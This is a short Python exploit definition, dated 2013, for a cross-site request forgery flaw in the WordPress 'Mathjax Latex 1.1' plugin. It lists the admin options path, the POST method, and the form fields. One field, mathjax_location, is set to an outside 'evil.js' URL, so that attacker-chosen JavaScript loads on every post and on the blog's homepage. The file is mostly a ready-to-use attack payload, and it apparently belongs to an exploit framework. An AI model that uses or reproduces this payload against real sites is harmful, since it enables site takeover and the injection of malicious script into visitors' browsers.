# -*- coding: utf-8 -*-

NAME = "Wordpress Mathjax Latex 1.1 CSRF"
DESCRIPTION = '''There is no CSRF protection on the mathjax option page.

This allows an attacker to specify arbitrary javascript that will be loaded with each post and also loaded onto the homepage of the wordpress blog'''

AUTHOR = "Junaid Hussain [ illSecure Research Group ]"
AUTHOR_URL = "http://illSecure.com"
DATE = "2013-03-25"

METHOD = "POST"
PATH = "/wp-admin/options-general.php?page=mathjax-latex.php"
FORM = {
    "id": "mathjaxlatex",
    "name": "mathjaxlatex"
}

PARAMS = [
    {
        "type": "hidden",
        "name": "mathjax_hidden",
        "value": "Y",
        "custom": False
    },
    {
        "type": "checkbox",
        "name": "force_load",
        "value": "1",
        "custom": False
    },
    {
        "type": "checkbox",
        "name": "default_disabled",
        "value": "1",
        "custom": False
    },
    {
        "type": "textbox",
        "name": "mathjax_location",
        "value": "http://illsecure.com/code/evil.js",
        "custom": True,
        "description": "Arbitraty JavaScript to be load."
    }
]